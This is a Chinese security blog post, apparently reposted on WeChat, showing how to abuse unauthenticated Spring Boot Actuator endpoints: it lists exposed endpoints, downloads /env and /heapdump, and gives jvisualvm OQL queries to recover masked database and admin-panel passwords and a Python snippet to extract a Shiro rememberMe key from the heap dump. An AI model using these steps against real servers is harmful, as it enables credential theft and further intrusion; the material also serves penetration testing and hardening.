---
title: Spring Boot Actuator未授权内存分析方法
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495128&idx=1&sn=8348750168970a4f8027592d98724266&chksm=e8a5e7bbdfd26eadb9d8b588145393bf3190b02efe64385dadba91a56a035c72ad8d7e6e2bb9&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-07-08
fetch_date: 2025-10-06T17:41:32.224488
---

# Spring Boot Actuator未授权内存分析方法

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj6ofPGzWk9aMkP2Ldpp5SyJ36QKdl6cnooia5WWxee4oAyh2xia0ZAs8OdSicqJwicPtTKP2MSSsn2pRg/0?wx_fmt=jpeg)

# Spring Boot Actuator未授权内存分析方法

迪哥讲事

以下文章来源于yudays实验室
，作者yudays

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7sPEUKMpk4lowa1VN2eBSX9O1sfup6GghZDGJzRYwygQ/0)

**yudays实验室**
.

安全相关与攻防实战分享

欢迎转发，请勿抄袭

        Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。

        未授权访问可以理解为需要授权才可以访问的页面由于错误的配置等其它原因，导致其它用户可以直接访问，从而引发各种敏感信息泄露。

**如何识别使用了Springboot框架**

1、查看ico图标（默认的情况下）

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv1OiazTYfbZXy7osAYNOlmZNE9QXQiaueL9U45v6XzpUYRCQxbG43yvRg/640?wx_fmt=png)

2、通过报错信息

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvZuOE7IvSNLv2x4iblXQbBlpRXdOnrvlLGibFJ4nYpJND87g3JtricXLDw/640?wx_fmt=png)

**常见Spring Boot Actuator未授权访问**

```
/dump - 显示线程转储（包括堆栈跟踪）
/autoconfig - 显示自动配置报告
/configprops - 显示配置属性
/trace - 显示最后几条HTTP消息（可能包含会话标识符）
/logfile - 输出日志文件的内容
/shutdown - 关闭应用程序
/info - 显示应用信息
/metrics - 显示当前应用的’指标’信息
/health - 显示应用程序的健康指标
/beans - 显示Spring Beans的完整列表
/mappings - 显示所有MVC控制器映射

/env - 提供对配置环境的访问

/heapdump - 转存堆文件

/restart - 重新启动应用程序

主要使用分析的文件heapdump文件

前期需要访问/env，来确定带星的信息，我们需要读取出来。

```
http://url/actuator/env
```
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv3zpyKVfHwibGuqK6P8ruDVgN1lYycupFLRSLkazv2RIfnU0iaxIHglDA/640?wx_fmt=png)

再次访问/heapdump文件

```
http://url/actuator/heapdump
```

得到一个heapdump的文件，使用java自带的软件jvisualvm进行分析。

```
C:\Program Files\Java\jdk1.8.0_231\bin\jvisualvm.exe
```

**常用分析方法：**

**一、去星，获取星号信息（适用于数据库密码、面板密码、wx.****secret****）**

1、载入堆文件

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv4SDRLnzodZ1VMHwibScX2kLXegkATIKYnu3tDDDuuTGGHR2nfkT1o6A/640?wx_fmt=png)

2、通过前面的env确定存在spring.datasource.password、spring.datasource.druid.stat-view-servlet.login-password等字段，可以构建OQL查询语句

```
select s from java.lang.String s where /查询字段/.test(s.value.toString())
```

3、可构建成如下

```
select s from java.lang.String s where /spring.datasource.druid.stat-view-servlet.login-password/.test(s.value.toString())
```

4、点击执行查询结果，出现实例

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvKUG2MjnYAILMZtEXYwwDADGpcTsMqLLgyYCmkytE7iagppHMRCQicuzg/640?wx_fmt=png)

5、进入实例里面，即可找到带星的明文信息。

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvmaecr3ulrQg08ricWT7YsgF1BHAnDXRvf6lHLSR3VBxdUbqR6zaATdA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv3rWlmxA3lMG8BxPvSk16ibY9FoQCKNPtFSXXvHjVsZ4nAYl5yhQ5miaw/640?wx_fmt=png)

6、假如出现不存在的明文信息的状态下，如：

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv6bXaCg742dY3AJHLECDwCOicLJe2PJkSVTFprm8mKetUjTfQs2QfKnQ/640?wx_fmt=png)

7、发现password相连处未发现明文密码，那么就得使用另外一条语句

```
select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())
```

8、查询结果

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvNT5huYibSpEUmrBo69KzzyBtmeNyfSQVWOSFQziaSUKzOHeEGlpickrsA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvCalp7e8vnspHjsM3lqzNAN7tpzB9R5ftDraw5h0PWICyzGlCFB0Ayw/640?wx_fmt=png)

**二、分析shrio序列化KEY（适用于自定key）**

1、通过访问站点，发现响应包或者请求包存在（remeberMe或者remeberme）

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvWrIaVSDxs7CgvBGGQmRpsaFs5U6NeplaznsXZXfokTxbo4nNNFVayQ/640?wx_fmt=png)

2、下载heapdump文件，在类处过滤语句

```
org.apache.shiro.web.mgt.CookieRememberMeManager
```

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvPO9fu5tkrwTtwUYSEicI2pqXTxsic4GrVB415QTCwR6ZDjJiafz1Vbq0A/640?wx_fmt=png)

3、点击展开，记录byte的值

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGv4aSQqrxfSFmQD6MFHnb7laJ84Ng5BjEQgALzppgeIkaf8IY1fMqSeg/640?wx_fmt=png)

4、使用脚本进行转换(将下面的x替换到相应的值)

```
import base64import structdata=struct.pack('<bbbbbbbbbbbbbbbb', -40, 11, -57, -123, -37, 32, 82,-51,5,x,x,-x,x,x,x,x)print(base64.b64encode(data))
```

5、编写完成之后，使用python执行，获得相关key

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvcribIlic4ZfX35Gc8aYp5ysJGTgsFKr6X6hpGudw3YibFrKiaCjClfOH6A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BDzX6q5EsXnw39sNo7aXc4iaFGluvSAGvARRiaUphCHKW1wnDqJtMicvGmib5picewoof8DQGaJAQaF3qVGPcwsPFWw/640?wx_fmt=png)

文章声明：该工具、教程仅供学习参考，请勿非法使用。否则与作者无关！

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款
前面有同学问我有没优惠券，这里发放100张100元的优惠券,用完今年不再发放

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj7N5nMaJbtnMPVw96ZcVbWfp6SGDicUaGZyrWOM67xP8Ot3ftyqOybMqbj1005WvMNbDJO0hOWkCaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

## 往期回顾

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过